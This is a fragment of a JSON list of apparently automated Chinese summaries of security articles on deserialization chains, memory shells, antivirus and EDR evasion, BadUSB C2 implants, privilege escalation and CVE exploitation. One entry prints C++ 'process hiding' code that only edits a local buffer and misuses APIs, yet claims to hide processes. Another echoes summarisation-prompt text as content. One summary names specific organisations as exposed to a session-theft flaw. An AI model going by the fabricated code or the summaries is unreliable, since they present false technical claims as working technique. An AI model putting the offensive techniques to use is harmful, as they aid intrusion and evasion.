        "page_content": "该文档介绍了在 InvokerTransformer 被禁止后，利用 Java 中的动态类加载来弹计算器的新方法。通过修改 TemplatesImpl 类的属性，可以加载恶意类并执行其静态或构造代码块中的代码，从而绕过 Runtime.exec 的限制。",
        "FileName": "12154-InvokerTransformer被ban后的另一种利用方法CC3.pdf"
    },
    {
        "page_content": "该文档介绍了 Motion Pro 漏洞，该漏洞允许攻击者通过两种方式窃取会话信息：通过包含会话信息的 JavaScript 文件或通过代理访问网站时携带的 VPN 域 cookie。受影响的网站包括谷歌搜索、东华大学、北京交通大学、香港航空控制系统、海航协同办公平台、中粮集团、长城证券、上海外国语大学、中国移动、阿里云、中金财富、江苏省电力设计院、用友集团和方正证券。",
        "FileName": "7710-Motion Pro漏洞.pdf"
    },
    {
        "page_content": "Free WMA MP3 Converter 1.8 中存在缓冲区溢出漏洞，该漏洞发生在 FWMCon.exe 的 sub_4B0FF4 函数中，由于转换文件格式时，复制音频文件时对音频文件的长度没有进行有效检查，从而导致了缓冲区溢出的发生。",
        "FileName": "9291-FREE WMA MP3 CONVERTER 1.8缓冲区溢出漏洞 调试.pdf"
    },
    {
        "page_content": "该文档分析了Tomcat中Executor内存马的实现，并通过修改NioEndpoint的Executor实现，成功注入了Container类型的内存马。但由于处理逻辑过于复杂，导致内存马的回显需要经过多次request才能实现。文档随后介绍了一种艰难的解决之路，通过找到Real NioSocketWrapper对象并使用其read方法获取当次的request请求，最终实现了内存马的回显。",
        "FileName": "11613-Executor内存马的实现（二）.pdf"
    },
    {
        "page_content": "MyuCMS_V2.1 存在任意文件下载、任意目录删除、SQL 注入、文件上传和命令执行等多个高危漏洞，这些漏洞的成因主要在于对用户输入参数缺乏验证和限制，导致攻击者可以利用这些漏洞进行恶意操作，如删除任意文件、注入恶意代码、上传恶意文件和执行任意命令。",
        "FileName": "7271-MyuCMS_V2.1漏洞分析.pdf"
    },
    {
        "page_content": "该文档详细介绍了 Antimalware Scan Interface (AMSI) 的工作原理，包括其功能、检测机制和绕过技术。它涵盖了主流和非主流的绕过方法，例如降级攻击、注册表禁用、内存补丁、劫持和 COM 服务器劫持。",
        "FileName": "11097-amsi绕过总结.pdf"
    },
    {
        "page_content": "该文档介绍了 SQLi_Labs 靶场中高级注入技术的学习分享，包括如何绕过过滤、利用二次注入、使用布尔盲注和报错注入等技巧，以获取数据库信息和修改数据。",
        "FileName": "12058-SQLi_Labs靶场之Advanced Injections学习分享.pdf"
    },
    {
        "page_content": "ROADtools 是一款用于渗透微软云上域的开源框架，其核心工具 ROADrecon 可通过 Azure AD 图的内部版本收集和分析 Azure AD 数据，并提供插件和 GUI 界面，方便用户探索和导出数据，帮助红队和蓝队了解 Azure AD 的工作原理和可能性。",
        "FileName": "7928-ROADtools - 微软云上域渗透框架.pdf"
    },
    {
        "page_content": "本文分析了云函数隐藏 C2 技术的防御反制思路，重点关注了流量特征，包括 stage 下载阶段的 payload 下载、beacon 心跳包阶段的通信模式和命令执行阶段的请求头特征。文中还提出了针对云函数隐藏 C2 技术的多种反制措施，如批量上线钓马、消耗云函数额度、虚假上线和截图举报等。",
        "FileName": "11625-对云函数隐藏C2技术的防御反制思路.pdf"
    },
    {
        "page_content": "本文档介绍了如何使用 AFL-Fuzz 挖掘 libxml2 2.9.2 版本中的漏洞，包括安装和配置 libxml2、编写测试程序、使用 ASAN 辅助挖掘漏洞、分析 crash 报告、改进测试程序和输入样本，以及最终成功挖掘出 CVE-2015-7497 漏洞。",
        "FileName": "7400-使用AFL挖掘libxml2.pdf"
    },
    {
        "page_content": "该文档记录了一次前端安全测试，重点关注一个传输过程中数据被加密的网站。测试人员通过分析网站的 JavaScript 代码，发现了敏感信息泄漏、任意用户密码修改和参数构造方法透明等漏洞。利用这些漏洞，测试人员最终获得了网站后台管理员权限。文档强调了在前端开发中保护敏感数据和加固代码的重要性，以防止类似的攻击。",
        "FileName": "10801-记一次前端安全测试.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Apache Kylin 中的两个漏洞：CVE-2022-24697 和 CVE-2022-43396。CVE-2022-24697 允许攻击者通过配置重写执行任意命令，而 CVE-2022-43396 是 CVE-2022-24697 的绕过，允许攻击者直接控制 kylin.engine.spark-cmd 执行任意命令。文档提供了漏洞的详细信息、影响版本、调试步骤和补丁链接。",
        "FileName": "12185-kylin CVE-2022-24697 & CVE-2022-43396.pdf"
    },
    {
        "page_content": "该文档探讨了使用 Go 语言进行静态免杀的各种技术，包括加密解密 shellcode、远程加载 shellcode 和使用 net/http 包远程加载 shellcode。它还提供了使用这些技术的示例代码，并讨论了如何避免在上传到杀毒软件时直接执行 shellcode。",
        "FileName": "10296-GO静态免杀初探.pdf"
    },
    {
        "page_content": "该文档介绍了一种使用 LNK 文件进行钓鱼攻击的技术，该攻击利用了目标公司的电子邮件地址，并使用加密文档和 LNK 文件来释放恶意软件，从而反弹 shell 到攻击者的 VPS。",
        "FileName": "9159-一次假想的LNK钓鱼攻击.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何绕过滑块验证码以获取高危漏洞。它分析了数据包，确定了验证逻辑，并提供了批量爆破的 Python 脚本。该方法利用了后端对验证码发送时间间隔没有限制的漏洞，并通过解密加密的坐标值来绕过滑块验证码。",
        "FileName": "12557-看我如何绕过滑块验证码拿到高危漏洞.pdf"
    },
    {
        "page_content": "该文档介绍了 Linux 内核中的各种安全保护机制，包括栈保护、地址随机化、执行保护和页面表隔离，以及如何通过关闭这些保护来利用内核漏洞获取 root 权限。",
        "FileName": "9748-Linux Kernel Pwn Part 1.pdf"
    },
    {
        "page_content": "Apache Solr ReplicationHandler 漏洞（CVE-2017-3163 和 CVE-2017-3164）涉及任意文件读取和服务器端请求伪造，由于输入数据处理不当，攻击者可以利用这些漏洞从 Solr 服务器提取索引文件或执行 HTTP GET 请求。",
        "FileName": "8374-Apache Solr ReplicationHandler漏洞浅析(CVE-2017-3163&&CVE-2017-3164).pdf"
    },
    {
        "page_content": "该文档介绍了使用 Frida 框架在 Android 应用程序中编写常见 hook 脚本的技术，包括 hook 普通方法、重载方法、构造对象参数和类属性。文档还提供了三个案例研究，展示了如何使用这些技术来解密加密字符串、分析签名算法和 hook so 文件中的代码。",
        "FileName": "12075-安卓编写常见的hook技巧（1）.pdf"
    },
    {
        "page_content": "该文档介绍了四种使用 QEMU 进行远程调试的方法，包括用户模式 + IDA、用户模式 + GDB、系统模式 + GDB 和系统模式 + IDA。这些方法涉及使用 QEMU 的 -g 选项挂起程序，然后使用 IDA 或 GDB 连接到调试端口进行跟踪和分析。文档还提供了详细的步骤和示例命令，以帮助用户根据自己的需求选择和实施最合适的调试方法。",
        "FileName": "10214-qemu四种远程调试方法.pdf"
    },
    {
        "page_content": "文档探讨了 certutil.exe 的功能和在内网渗透中的应用，包括下载、编码、解码、替代数据流等，并介绍了绕过杀软的两种方法，以及如何使用 certutil 校验文件哈希值和加载内存中的有效载荷。",
        "FileName": "9737-关于certutil的探究.pdf"
    },
    {
        "page_content": "SnakeYaml 反序列化漏洞利用 YAML 解析类库 SnakeYaml 的反序列化漏洞，可通过指定全类名的方式实例化恶意类，实现任意代码执行。",
        "FileName": "11599-SnakeYaml反序列化.pdf"
    },
    {
        "page_content": "本文档详细介绍了使用 Cobalt Strike 中的 DNS Beacon 进行隐蔽通信的配置和原理。它解释了 DNS Beacon 的工作原理，强调了与 HTTP/HTTPS 的区别，并提供了详细的配置说明。文档还讨论了使用 stageless 和 stager beacon 的差异，并通过流量分析验证了 DNS Beacon 的通信过程。此外，它还提供了有关隐蔽通信的附加工具和资源。",
        "FileName": "7938-踩坑记录-DNS Beacon.pdf"
    },
    {
        "page_content": "该文档讨论了对招聘网站进行 Web 渗透测试，重点关注水平越权、SQL 注入和文件上传漏洞。测试人员通过查找未授权接口、执行 SQL 注入和上传不同后缀的文件来发现这些漏洞，从而泄露敏感信息，例如身份证号。",
        "FileName": "12549-Web渗透——百花齐放.pdf"
    },
    {
        "page_content": "该文档介绍了 Squid 代理服务器中 CVE-2019-18679 漏洞的分析和利用，该漏洞允许攻击者通过 Digest 身份验证泄露敏感内存地址。文档详细描述了漏洞的复现步骤，分析了漏洞发生的函数，并提出了修复建议。",
        "FileName": "7771-CVE-2019-18679 Squid 敏感信息泄漏.pdf"
    },
    {
        "page_content": "迅睿 CMS 存在多个版本的安全漏洞，包括后台任意代码注入、前台代码注入和文件上传漏洞。这些漏洞允许攻击者在满足特定条件下执行任意代码、注入恶意代码或上传任意文件。",
        "FileName": "11457-某CMS漏洞总结.pdf"
    },
    {
        "page_content": "该文档分析了 Java EE 企业级快速开发平台 RuoYi 的主题和内容，包括用户管理、部门管理、岗位管理、菜单管理、角色管理、字典管理、参数管理、通知公告、操作日志、登录日志、在线用户、定时任务、代码生成、系统接口、服务监控、缓存监控、在线构建器、连接池监视等功能模块。",
        "FileName": "11928-【代码审计】若依后台管理系统.pdf"
    },
    {
        "page_content": "本文档介绍了 OpenRASP 的启动和初始化过程，包括 V8 引擎加载、插件初始化、字节码转换器初始化、插桩配置和检测类型的加载。它还详细分析了 XXE 检测的流程，从危险函数的 Hook 到检测代码的添加和检查逻辑的执行。",
        "FileName": "12613-js引擎检测及热部署的OpenRASP学习.pdf"
    },
    {
        "page_content": "这篇文档讨论了在 Windows on ARM64 架构上应用创新 Rootkit 技术，包括 SSDT Hooking、VBAR Hooking 和直接内核对象操作 (DKOM)，并介绍了 Windows on ARM Rootkit Detector (WOARKD) 工具，用于检测这些技术。",
        "FileName": "12804-奇妙的Rootkits：在哪里找到它们（第3部分）-ARM版.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 Spring 通用的 MemShell 绕过 thymeleaf SSTI 漏洞修复，并通过 Apache Tomcat 9 URL 处理和替代技巧，在不联网的情况下注入内存回显马，读取 flag 回显结果。",
        "FileName": "11688-2022 网鼎杯玄武组-you can find it 题解—Spring通用MemShell改造.pdf"
    },
    {
        "page_content": "该文档分析了 Linksys WRT54G 路由器中一个缓冲区溢出漏洞，该漏洞允许攻击者通过向路由器发送精心设计的 HTTP POST 请求来执行任意代码。该漏洞是由 do_apply_post 函数中对 POST 数据长度的未经验证导致的，该函数允许攻击者覆盖路由器内存中的多个段，包括 strlen 函数地址。通过覆盖 strlen 函数地址，攻击者可以劫持执行流程并执行任意代码。",
        "FileName": "10068-Linksys WRT54G路由器溢出漏洞分析–运行环境修复.pdf"
    },
    {
        "page_content": "该文档介绍了如何劫持国外某云平台的 BucketName，利用其漏洞开放匿名读取功能，从而可以上传恶意文件窃取用户信息。该方法涉及创建同名桶、修改访问控制权限、设置自定义域名，最终实现劫持成功。",
        "FileName": "10050-渗透测试之劫持国外某云BucketName.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2019-16057 漏洞，该漏洞影响 Dlink DNS320 NAS 网络存储设备，允许未经身份验证的攻击者通过命令注入执行任意命令。文档详细介绍了漏洞的触发条件、固件分析、漏洞利用和修复措施，并提供了参考链接和补丁对比。",
        "FileName": "7083-CVE-2019-16057 Dlink DNS320 NAS网盘 无需认证 命令注入漏洞分析.pdf"
    },
    {
        "page_content": "本文探讨了 APT 组织常用的 Rootkit 自我保护技术，包括 Ramsay 框架和 Hellsing 组织使用的技术。这些技术用于隐藏文件和进程，对抗杀毒软件和安全措施。本文还介绍了检测和恢复 Rootkit 挂钩的方法，例如 SSDT 检测、FSD 检测和进程断链检测。",
        "FileName": "8675-细说APT之Rootkit自我保护.pdf"
    },
    {
        "page_content": "该文档详细介绍了作者如何通过信息收集和前端信息泄露，从一个教育机构的网站漏洞中挖掘到内网渗透权限。作者利用 Google Hack 和 ARL 资产收集技术发现了敏感信息，并通过修改 URL 和拼接内网地址，成功访问了内网服务器。随后，作者通过前端信息泄露和尝试访问，找到了一个宝塔地址，并利用弱口令成功进入系统，最终通过反弹 shell 和下载后门，实现了内网渗透。",
        "FileName": "11000-记一次edu漏洞挖掘——从信息泄露到内网滲透.pdf"
    },
    {
        "page_content": "本文分析了 16 道 XSS 实例，重点介绍了第 7、8、9 题的构造和绕过思路。第 7 题通过跳出 script 标签，利用模板字符串绕过单引号限制；第 8 题利用 <!--<script> 跳出 script 标签，绕过双引号过滤；第 9 题对双引号过滤方式和输出点限制进行了修改，需要更复杂的构造思路。",
        "FileName": "11682-一些BAT的XSS实例（三）中级篇.pdf"
    },
    {
        "page_content": "该文档分析了通达 OA 系统中的两个任意用户登录漏洞。第一个漏洞利用了 logincheck_code.php 文件中未经验证的输入，允许攻击者通过设置 UID 和 CODEUID 变量来伪造登录会话。第二个漏洞利用了 login_code_scan.php 文件中未经验证的输入，允许攻击者通过设置 CODE_INFO_PC 缓存项来伪造登录会话。文档还提供了漏洞修复措施，包括在 logincheck_code.php 中添加权限验证和在 login_code_scan.php 中添加登录验证。",
        "FileName": "7704-通达OA前台任意用户登录分析.pdf"
    },
    {
        "page_content": "本文档主要介绍了使用 Java Instrumentation API 和 Java Native Interface (JNI) 来修改 Java 应用程序的字节码和执行任意代码。它讨论了使用 ptrace 来获取 JNI 环境上下文，并提供了使用 C++ 开发的 taycan-sdk，该 SDK 允许在 Java 虚拟机 (JVM) 中修改任意类、执行任意代码并完成 hook、内存 shell 注入和反射等功能。",
        "FileName": "10311-Use ptrace to instrument java bytecode.pdf"
    },
    {
        "page_content": "该文档提供了有关 Windows 系统中提权操作和技术的全面指南，涵盖了使用各种工具和方法，包括 bitsadmin、certutil、iwr、PowerShell 脚本、MSFvenom、accesschk、WinPEAS、RottenPotato 和 JuicyPotato，以在 Windows 系统中获得更高的权限。",
        "FileName": "12588-Window提权相关操作和技巧.pdf"
    },
    {
        "page_content": "                    本文档主题是：分析 CTF Pyjail 沙箱逃逸绕过合集，内容包括：\n                    1. 分析文档的主题和内容\n                    2. 用一段话概括文档\n                    3. 绕过删除模块或方法\n                    4. 绕过基于字符串匹配的过滤\n                    5. 绕过⻓度限制\n                    6. 变量覆盖与函数篡改\n                    7. 绕过 audit hook\n                    8. 绕过 AST 沙箱\n                    9. 其他技巧\n                    10. 模拟 no builitins 环境\n                    11. 参考资料",
        "FileName": "12647-CTF Pyjail 沙箱逃逸绕过合集.pdf"
    },
    {
        "page_content": "该文档介绍了如何使用 BadUsb 实现免杀并即插即上线 C2 服务器。它提供了详细的步骤，包括购买 BadUsb、安装 Arduino IDE、编写代码、优化代码以解决问题，以及最终实现免杀上线。",
        "FileName": "12505-BadUsb实现免杀及插及上线C2服务器.pdf"
    },
    {
        "page_content": "本文档主要介绍了域渗透中 Kerberos 委派攻击的利用手法，包括非约束委派、约束委派和基于资源的约束委派，并详细阐述了它们的配置、发现和利用场景，强调了这些委派配置的安全问题，以及如何利用它们在域内横向移动和提权。",
        "FileName": "10061-Kerberos委派攻击的那些事.pdf"
    },
    {
        "page_content": "本文档分析了如何利用 Dlink DIR-645 路由器固件中的缓冲区溢出漏洞，该漏洞允许攻击者通过覆盖返回地址并设置参数来执行任意代码。作者通过模拟攻击过程、扩展系统调用、构造 ROP 小工具和编写利用脚本，逐步演示了漏洞利用过程。",
        "FileName": "8934-使用Qiling分析Dlink DIR-645中的缓冲区溢出(part II).pdf"
    },
    {
        "page_content": "该文档介绍了如何通过拦截器注入恶意代码，实现远程命令执行、Spel 表达式注入和蚁剑连接等攻击手段，并提供了详细的代码示例和踩坑点记录。",
        "FileName": "9746-SpringBoot拦截器注入内存马实验.pdf"
    },
    {
        "page_content": "该文档分析了 Apache RocketMQ 远程代码执行漏洞 (CVE-2023-33246)，该漏洞允许攻击者通过更新配置功能以系统用户身份执行命令。文档提供了漏洞复现步骤、补丁分析和利用过程，并强调了通过调整数据包中的代码字段值来触发不同功能的重要性。",
        "FileName": "12589-Apache RocketMQ 远程代码执行漏洞 CVE-2023-33246 分析.pdf"
    },
    {
        "page_content": "该文档介绍了 Windows 本地认证机制中使用的 LM 和 NTLM 哈希算法，并讨论了如何使用 Mimikatz 和 Procdump 工具从 lsass.exe 进程中提取密码哈希。",
        "FileName": "8127-由Windows本地认证到Hash抓取.pdf"
    },
    {
        "page_content": "该文档分析了 Java 安全中 JEP290 在 RMI 中的实现，重点关注了 RMI 中内置过滤器的创建和使用。它还讨论了如何绕过低版本 JDK 中的限制，利用恶意 JRMP 服务执行命令。",
        "FileName": "11957-Java安全中JEP290在RMI的实现及绕过低版本JDK限制.pdf"
    },
    {
        "page_content": "该文档分析了如何利用 SEH 和 Egghunter 对 GMON 命令进行利用，并提供了分步说明和代码示例，以展示如何覆盖 SEH 链、确定偏移量、生成 egghunter 和 shellcode，以及最终执行利用以获得 shell 访问权限。",
        "FileName": "12285-通过SEH和Egghunter对GMON命令进行利用.pdf"
    },
    {
        "page_content": "本文探讨了在数据包被加密和签名保护的情况下进行渗透测试的方法，介绍了常见的加密算法分析流程、Burp插件开发和联动Xray半自动化漏洞挖掘的通用测试流程，并通过案例演示了如何还原加密算法、开发Burp插件自动更新签名校验参数、绕过数据包分段加密和联动Xray进行半自动化安全测试。",
        "FileName": "12295-浅谈在数据包被加密和签名保护时的渗透方式.pdf"
    },
    {
        "page_content": "该文档主要介绍了如何对二进制指令进行混淆，包括函数分析和代码块粉碎，通过识别函数起始地址和大小，将函数指令随机乱序放置在新的空间，并修复跳转关系和重定位表，从而实现对函数的“粉碎”。",
        "FileName": "7091-X86指令混淆之函数分析和代码块粉碎.pdf"
    },
    {
        "page_content": "本文介绍了 NimShellCodeLoader 免杀加载器的使用和测试，该加载器提供了 21 种注入加载方法和两种加密技术，但目前无法直接绕过 Windows Defender。作者提供了踩坑日记和免杀方法，但由于篇幅限制，仅测试了凯撒加密和 3DES 加密，结果显示所有方法均被 Windows Defender 查杀。",
        "FileName": "11052-Nim之NimShellCodeLoader免杀学习.pdf"
    },
    {
        "page_content": "该文档主要介绍了 MySQL 中的 SQL 注入攻击，包括各种注入技术、绕过 WAF 的方法、查询出当前执⾏的 SQL 语句、查询出数据库、表、列信息、安全处理 null 值、有 null 值会混乱列的顺序、创建用户、加密函数、文件操作、修改⽇志路径、写⽂件、命令执⾏、条件、bool 注⼊、time 注⼊、union 注⼊、stack 注⼊、inline 注⼊、oob 注⼊、宽字节注⼊、cast、length、isnull、delimiter、limit、order、count、comment、substring、concatenate、case、hex、inference、banner、current_user、current_db、hostname、table_comment、column_comment、is_dba、check_udf、users、passwords、privileges、statements、dbs、tables、columns、dump_table、search_db、search_table、search_column 等内容。",
        "FileName": "12451-MySQL 注入备忘录.pdf"
    },
    {
        "page_content": "本文探讨了 Java 反序列化回显的多种方法，包括 defineClass、RMI 绑定实例、URLClassLoader 抛出异常、中间件、写文件、dnslog 等，并提供了代码示例和相关技术细节。",
        "FileName": "7740-Java 反序列化回显的多种姿势.pdf"
    },
    {
        "page_content": "该文档分析了 Weblogic 2020-2555 和 2883 漏洞，这些漏洞利用了 ChainedExtractor 和 ReflectionExtractor 中的 extract 方法，以及 LimitFilter 中的 toString 方法，通过精心构造的序列化对象触发反序列化漏洞，从而执行任意代码。",
        "FileName": "8080-Weblogic 2020-2555&2883分析.pdf"
    },
    {
        "page_content": "本文探讨了 JavaScript 中的变量升级现象，即在函数或块级作用域内声明的变量或函数可以提升到全局作用域。这种提升会带来安全隐患，例如 XSS 攻击。文章通过多个示例展示了变量升级的原理和危害，并建议使用 ES6 中的 `let` 和 `const` 来避免此类问题。",
        "FileName": "7527-谈谈Javascript中的变量升级.pdf"
    },
    {
        "page_content": "该文档重点介绍了渗透测试中的信息收集技术，包括主动和被动信息收集方法。主动信息收集涉及直接访问和扫描目标网站，而被动信息收集利用第三方服务来了解目标。文档还提供了有关域名注册人信息收集、子域名爆破、域传送漏洞检测、CDN检测和绕过、Google Hack 语法、网络组件搜索引擎、GitHub 敏感信息泄露、操作系统类型判断、网站指纹识别、网站容器和脚本类型识别、敏感文件和目录信息收集、端口收集以及社会工程学等主题的信息。",
        "FileName": "8358-渗透测试之信息收集.pdf"
    },
    {
        "page_content": "该文档讨论了直接系统调用，这是一种 Windows 系统操作，允许用户模式临时切换到内核模式。攻击者可以使用直接系统调用绕过 EDR（端点检测和响应）工具，因为 EDR 通常在 Ring3 层挂钩 API 调用。文档提供了实现直接系统调用的 C++ 代码示例，并解释了如何使用 SysWhispers2 库获取系统调用号。",
        "FileName": "12903-直接系统调用学习记录.pdf"
    },
    {
        "page_content": "该文档总结了 Python 沙箱逃逸技术，包括利用冷门库、getattr、code 对象和 object 子类等方法，以绕过限制并执行任意代码。它还讨论了如何利用已导入的模块、加载 C 扩展和劫持赋值来绕过限制。",
        "FileName": "9178-python沙箱逃逸总结.pdf"
    },
    {
        "page_content": "**主题：** 脏牛提权漏洞复现及获取完全交互式 shell\n\n**内容：** 文档详细介绍了脏牛漏洞的原理、影响范围和复现步骤。它指导读者在 CentOS 6 环境中利用该漏洞获取 root 权限，并通过修改 su 或 passwd 程序来实现。此外，文档还提供了如何获得完全交互式 shell 的方法，包括使用 python 脚本、nc 反弹 shell 和修改 /etc/sudoers 文件。",
        "FileName": "9757-脏牛提权复现以及如何得到一个完全交互的shell.pdf"
    },
    {
        "page_content": "**文档主题：**进程隐藏功能的代码实现\n\n**文档内容：**\n\n本篇文档将分享有关于进程隐藏功能的代码实现，该功能可使指定进程在其他进程查看到系统中的所有进程信息时无法被发现。\n\n**实现原理：**\n\n进程隐藏功能的实现主要分为以下几个步骤：\n\n1. **获取系统进程信息：**通过调用 ZwQuerySystemInformation 函数获取系统中所有进程的信息，并将其存储在链表中。\n2. **查找目标进程：**遍历链表，查找需要隐藏的目标进程。\n3. **修改进程链表：**找到目标进程后，修改链表中的指针，将目标进程从链表中移除。\n4. **释放资源：**释放获取系统进程信息时分配的内存空间。\n\n**代码实现：**\n\n```c++\n#include <windows.h>\n#include <stdio.h>\n#include <tlhelp32.h>\n\n// 定义进程信息结构体\ntypedef struct _SYSTEM_PROCESS_INFORMATION {\n    ULONG NextEntryOffset;\n    ULONG NumberOfThreads;\n    BYTE Reserved1[48];\n    PVOID Reserved2[3];\n    HANDLE UniqueProcessId;\n    PVOID Reserved3;\n    ULONG HandleCount;\n    BYTE Reserved4[4];\n    PVOID Reserved5[11];\n    SIZE_T PeakPagefileUsage;\n    SIZE_T PrivatePageCount;\n    LARGE_INTEGER Reserved6[6];\n} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;\n\n// 定义获取系统进程信息的函数\ntypedef NTSTATUS (WINAPI *PFZWQUERYSYSTEMINFORMATION)(\n    SYSTEM_INFORMATION_CLASS SystemInformationClass,\n    PVOID SystemInformation,\n    ULONG SystemInformationLength,\n    PULONG ReturnLength\n);\n\n// 定义修改进程链表的函数\ntypedef BOOL (WINAPI *PFMODIFYPROCESSLINK)(\n    PSYSTEM_PROCESS_INFORMATION ProcessInformation,\n    HANDLE TargetProcessId\n);\n\n// 获取系统进程信息\nBOOL GetSystemProcessInformation(PSYSTEM_PROCESS_INFORMATION *ProcessInformation) {\n    NTSTATUS status;\n    PFZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation;\n    ULONG ReturnLength;\n\n    // 获取 ZwQuerySystemInformation 函数地址\n    ZwQuerySystemInformation = (PFZWQUERYSYSTEMINFORMATION)GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"ZwQuerySystemInformation\");\n\n    // 分配内存空间存储进程信息\n    *ProcessInformation = (PSYSTEM_PROCESS_INFORMATION)VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_READWRITE);\n\n    // 调用 ZwQuerySystemInformation 函数获取进程信息\n    status = ZwQuerySystemInformation(SystemProcessInformation, *ProcessInformation, 4096, &ReturnLength);\n\n    // 判断是否获取成功\n    if (status != STATUS_SUCCESS) {\n        VirtualFree(*ProcessInformation);\n        return FALSE;\n    }\n\n    return TRUE;\n}\n\n// 查找目标进程\nPSYSTEM_PROCESS_INFORMATION FindTargetProcess(PSYSTEM_PROCESS_INFORMATION ProcessInformation, HANDLE TargetProcessId) {\n    PSYSTEM_PROCESS_INFORMATION CurrentProcess;\n\n    // 遍历链表查找目标进程\n    CurrentProcess = ProcessInformation;\n    while (CurrentProcess != NULL) {\n        if (CurrentProcess->UniqueProcessId == TargetProcessId) {\n            return CurrentProcess;\n        }\n        CurrentProcess = (PSYSTEM_PROCESS_INFORMATION)((ULONG)CurrentProcess + CurrentProcess->NextEntryOffset);\n    }\n\n    return NULL;\n}\n\n// 修改进程链表\nBOOL ModifyProcessLink(PSYSTEM_PROCESS_INFORMATION ProcessInformation, HANDLE TargetProcessId) {\n    PSYSTEM_PROCESS_INFORMATION TargetProcess;\n    PSYSTEM_PROCESS_INFORMATION PreviousProcess;\n\n    // 查找目标进程\n    TargetProcess = FindTargetProcess(ProcessInformation, TargetProcessId);\n    if (TargetProcess == NULL) {\n        return FALSE;\n    }\n\n    // 找到目标进程的前一个进程\n    PreviousProcess = ProcessInformation;\n    while (PreviousProcess->NextEntryOffset != 0 && PreviousProcess->NextEntryOffset != (ULONG)TargetProcess) {\n        PreviousProcess = (PSYSTEM_PROCESS_INFORMATION)((ULONG)PreviousProcess + PreviousProcess->NextEntryOffset);\n    }\n\n    // 修改链表指针\n    if (PreviousProcess->NextEntryOffset == 0) {\n        // 目标进程是链表的最后一个进程\n        PreviousProcess->NextEntryOffset = 0;\n    } else {\n        // 目标进程不是链表的最后一个进程\n        PreviousProcess->NextEntryOffset += TargetProcess->NextEntryOffset;\n    }\n\n    return TRUE;\n}\n\n// 释放资源\nvoid FreeResources(PSYSTEM_PROCESS_INFORMATION ProcessInformation) {\n    // 释放进程信息内存空间\n    VirtualFree(ProcessInformation);\n}\n\n// 主函数\nint main() {\n    PSYSTEM_PROCESS_INFORMATION ProcessInformation;\n    HANDLE TargetProcessId;\n\n    // 获取系统进程信息\n    if (!GetSystemProcessInformation(&ProcessInformation)) {\n        printf(\"获取系统进程信息失败！\\n\");\n        return 1;\n    }\n\n    // 输入需要隐藏的进程 ID\n    printf(\"请输入需要隐藏的进程 ID：\");\n    scanf(\"%d\", &TargetProcessId);\n\n    // 修改进程链表\n    if (!ModifyProcessLink(ProcessInformation, TargetProcessId)) {\n        printf(\"修改进程链表失败！\\n\");\n        FreeResources(ProcessInformation);\n        return 1;\n    }\n\n    // 释放资源\n    FreeResources(ProcessInformation);\n\n    printf(\"进程隐藏成功！\\n\");\n    return 0;\n}\n```\n\n**使用说明：**\n\n1. 将代码保存为一个 C++ 文件，例如 `hide_process.cpp`。\n2. 使用 Visual Studio 或其他 C++ 编译器编译代码。\n3. 运行编译后的可执行文件。\n4. 在提示符中输入需要隐藏的进程 ID。\n5. 进程隐藏成功后，该进程将从其他进程查看到的系统进程信息中消失。\n\n**注意事项：**\n\n* 该代码仅适用于 Windows 操作系统。\n* 需要管理员权限才能运行该代码。\n* 隐藏进程后，该进程仍然在运行，只是其他进程无法看到它。\n* 卸载该代码后，隐藏的进程将重新出现在系统进程信息中。",
        "FileName": "12018-API钩取：进程的隐藏与全局钩取.pdf"
    },
    {
        "page_content": "**主题：** Juniper 新洞 CVE-2023-36845 分析\n\n**内容：** CVE-2023-36845 是 Juniper 防火墙和交换机中的一个严重漏洞，允许攻击者通过上传恶意文件并更改 PHP 环境变量来执行远程代码。尽管 Juniper 声称该漏洞的 CVSS 评分为 5.3，但研究人员发现它可以导致 RCE，甚至获得管理员权限，因此其 CVSS 评分应为 9.8。研究人员提供了概念验证代码，展示了如何利用该漏洞，但 Juniper 的安全措施限制了其利用范围。",
        "FileName": "12892-Juniper新洞CVE-2023-36845浅析.pdf"
    },
    {
        "page_content": "CVE-2021-4034 漏洞利用 polkit 中 pkexec 工具的数组越界写漏洞，通过构造恶意环境变量 GCONV_PATH，劫持执行流，最终导致任意命令执行。该漏洞影响所有版本的 pkexec，利用过程涉及创建恶意 so 文件和设置特定环境变量，触发 g_printerr 函数调用，从而执行 so 中的恶意代码。",
        "FileName": "10870-CVE-2021-4034 深入分析及漏洞复现.pdf"
    },
    {
        "page_content": "**主题：** 实战渗透技巧，通过扫描备份文件和利用未登录漏洞，成功获取系统管理员权限并上传恶意代码。\n\n**内容：** 文档详细介绍了作者在渗透测试中发现的备份文件扫描漏洞，通过该漏洞获取了默认账户密码，并利用未登录漏洞绕过登录限制。随后，作者通过分析代码，发现了未经验证的文件上传漏洞，并利用该漏洞上传了恶意代码，最终获得了系统管理员权限。",
        "FileName": "8132-实战渗透 -  一个怎么够？我全都要！.pdf"
    },
    {
        "page_content": "该文档主要讨论了 Active Directory (AD) 中访问控制列表 (ACL) 的概念和滥用，重点介绍了如何使用各种工具和技术来检测和利用 ACL 权限，以提升域内权限并最终获得对域的完全控制。",
        "FileName": "12462-团队内部红蓝对抗之How2PwnACLs.pdf"
    },
    {
        "page_content": "该文档介绍了 Twig 模板引擎中通用的服务器端模板注入 (SSTI) 有效负载，这些有效负载适用于 Twig 的所有版本。它提供了利用 Twig 中允许用户传递箭头函数的 map 函数的有效负载，该函数可以转换为闭包函数。文档还讨论了其他可用于命令执行的函数，例如 sort、filter 和 reduce，并提供了利用这些函数的有效负载示例。",
        "FileName": "7518-TWIG 全版本通用 SSTI payloads.pdf"
    },
    {
        "page_content": "本文探讨了 Python Opcode 逃逸技术，通过分析 Python 虚拟机执行环境和 PyCodeObject 结构，展示了如何构造一个自定义的 __code__ 对象来修改函数逻辑。文中还介绍了 Python 字节码和 opcode 的关系，以及如何通过 opcode 库和 dis 库进行字节码分析和转换。最后，文章提供了 Python debug 环境的设置方法和常用调试指令，方便读者深入探索 Python 虚拟机内部机制。",
        "FileName": "7828-初探PythonOpcode逃逸.pdf"
    },
    {
